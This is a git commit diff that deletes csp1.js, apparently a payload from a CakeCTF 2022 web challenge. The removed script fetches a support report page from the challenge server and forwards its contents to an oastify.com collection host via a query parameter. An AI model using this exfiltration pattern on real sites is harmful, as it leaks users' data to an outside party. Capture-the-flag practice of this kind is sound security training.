941d93e08ce082ed5bd9ce88623e6cbf9408ce81
Lê Ngọc Hoa <68491164+lengochoa7112000@users.noreply.github.com>
2022-09-04 01:13:49 +0700

    Delete csp1.js

--- csp1.js
+++
@@ -1,5 +0,0 @@
-fetch("http://web1.2022.cakectf.com:8003/api/support/report").then((res) => {
-    return res.text();
-}).then(data => {
-    fetch("https://l4qs5ogox3mbe3syub12hhnas1ytmi.oastify.com?data="+data);
-})
